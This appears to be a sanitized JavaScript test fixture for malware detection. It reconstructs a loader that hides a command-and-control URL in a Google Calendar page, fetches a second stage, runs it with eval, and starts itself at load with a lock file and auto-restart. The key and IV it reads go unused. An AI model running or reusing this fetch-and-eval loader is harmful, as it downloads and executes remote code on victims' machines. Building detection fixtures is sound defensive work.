// SANITIZED TEST FIXTURE — reconstructed from public IOCs for detection testing
// Wave 1: Google Calendar C2 pattern (Mar-May 2025)
// Source: Aikido "Delivering malware via Google Calendar invites and PUAs"

async function fetchCalendarC2() {
    // Fetch Google Calendar page to extract C2 URL from data-base-title attribute
    const calendarUrl = "https://calendar.google.com/calendar/embed?src=test%40example.com";
    const response = await fetch(calendarUrl);
    const html = await response.text();
    
    // Extract base64-encoded URL from data-base-title attribute
    const match = html.match(/data-base-title="([A-Za-z0-9+/=]+)"/);
    if (match) {
        const encodedUrl = atob(match[1]);
        
        // Follow redirects manually
        const redirectResponse = await fetch(encodedUrl, { redirect: 'manual' });
        const finalUrl = redirectResponse.headers.get('location') || encodedUrl;
        
        // Second-stage fetch - read response headers for IV and key
        const payloadResponse = await fetch(finalUrl);
        const ivBase64 = payloadResponse.headers.get('ivbase64');
        const secretKey = payloadResponse.headers.get('secretKey');
        
        if (ivBase64 && secretKey) {
            const iv = Buffer.from(atob(ivBase64), 'binary');
            const key = Buffer.from(atob(secretKey), 'binary');
            
            // Read body as base64 JS payload
            const encryptedBody = await payloadResponse.text();
            const payload = atob(encryptedBody);
            
            // Execute via eval(atob(payload))
            eval(atob(payload));
        }
    }
}

// Retry/orchestrator loop that recurses on failure
async function orchestrator(maxRetries = 3) {
    let attempts = 0;
    while (attempts < maxRetries) {
        try {
            await fetchCalendarC2();
            break;
        } catch (err) {
            attempts++;
            if (attempts >= maxRetries) {
                // Write to log file and retry
                const fs = require('fs');
                fs.appendFileSync('error.log', `${new Date().toISOString()}: ${err.message}\n`);
                setTimeout(() => orchestrator(maxRetries), 5000);
            }
        }
    }
}

// Single-instance lock via temp file
const lockFile = process.env.TEMP + '\\pqlatt';
const fs = require('fs');
if (!fs.existsSync(lockFile)) {
    fs.writeFileSync(lockFile, process.pid.toString());
    orchestrator();
}

// Uncaught exception handler that writes to log and retries
process.on('uncaughtException', (err) => {
    fs.appendFileSync('error.log', `Uncaught: ${err.message}\n`);
    setTimeout(() => orchestrator(), 1000);
});
